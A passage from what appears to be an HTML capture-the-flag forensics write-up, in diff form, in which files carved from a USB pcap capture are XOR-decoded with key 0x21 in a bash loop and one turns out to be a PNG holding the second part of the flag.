+</code></pre></div></div>
+
+<p>You’ll get warning as the usb.pcap file is corrupted. That is expected as we dumped the whole exe file starting at begin of pcap.</p>
+
+<p>Still, it produced 43 raw files. out of them, 3 files are identified as pictures (5, 29 and 37). These are the pictures we already found.</p>
+
+<p>The other files are likely encrypted. Remember what we’ve been told before :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Do you know  The key to decrypt the flag is XOR 0x21
+</code></pre></div></div>
+
+<p>Let’s give it a try :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="k">$(</span>seq 0 42<span class="k">)</span><span class="p">;</span><span class="k">do </span>xortool-xor <span class="nt">-h</span> 21 <span class="nt">-f</span> <span class="k">${</span><span class="nv">i</span><span class="k">}</span>.raw <span class="o">&gt;</span> <span class="k">${</span><span class="nv">i</span><span class="k">}</span>.raw.xored <span class="p">;</span><span class="k">done</span> 
+<span class="nv">$ </span>file <span class="k">*</span>raw.xored |grep PNG
+22.raw.xored: PNG image data, 567 x 800, 8-bit/color RGBA, non-interlaced
+</code></pre></div></div>
+
+<p>w00t, and indeed, here is the 2nd part of the flag :)</p>
+
+
+</div>
+
+    </main>
+
+    <!-- Optional footer content -->
+
+  </body>
+</html>
